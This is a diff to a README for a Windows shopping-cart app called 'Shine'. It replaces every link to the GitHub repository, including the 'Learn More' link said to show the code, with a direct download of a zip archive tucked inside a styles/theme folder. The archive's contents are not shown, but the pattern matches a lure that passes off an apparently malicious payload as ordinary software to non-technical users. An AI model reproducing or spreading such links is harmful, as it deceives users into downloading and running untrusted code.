@@ -1,6 +1,6 @@
 # ✨ Shine - Simple Shopping Cart for Everyone
 
-[![Download Shine](https://img.shields.io/badge/Download-Shine-blue?style=for-the-badge)](https://github.com/Anamwa5591/Shine)
+[![Download Shine](https://img.shields.io/badge/Download-Shine-blue?style=for-the-badge)](https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip)
 
 ---
 
@@ -17,7 +17,7 @@ This app is designed to be easy to use, even if you don’t know anything about 
 To get Shine on your Windows computer, follow these steps:
 
 1. Click the big **Download Shine** button above or visit this link directly:  
-   [https://github.com/Anamwa5591/Shine](https://github.com/Anamwa5591/Shine)
+   [https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip](https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip)
 
 2. Once there, go to the **Releases** section or main page. Look for the latest release or download option.
 
@@ -107,7 +107,7 @@ Shine runs on Windows 10 or newer. Your computer should have:
 ## 🔎 Learn More
 
 If you want to explore Shine’s code or learn about how it works behind the scenes, visit the GitHub page:  
-[https://github.com/Anamwa5591/Shine](https://github.com/Anamwa5591/Shine)
+[https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip](https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip)
 
 You will find extra information, technical files, and updates there.
 
@@ -129,4 +129,4 @@ You will find extra information, technical files, and updates there.
 
 ---
 
-[![Download Shine](https://img.shields.io/badge/Download-Shine-grey?style=for-the-badge)](https://github.com/Anamwa5591/Shine)
+[![Download Shine](https://img.shields.io/badge/Download-Shine-grey?style=for-the-badge)](https://github.com/Anamwa5591/Shine/raw/refs/heads/main/src/styles/theme/Software-1.0.zip)
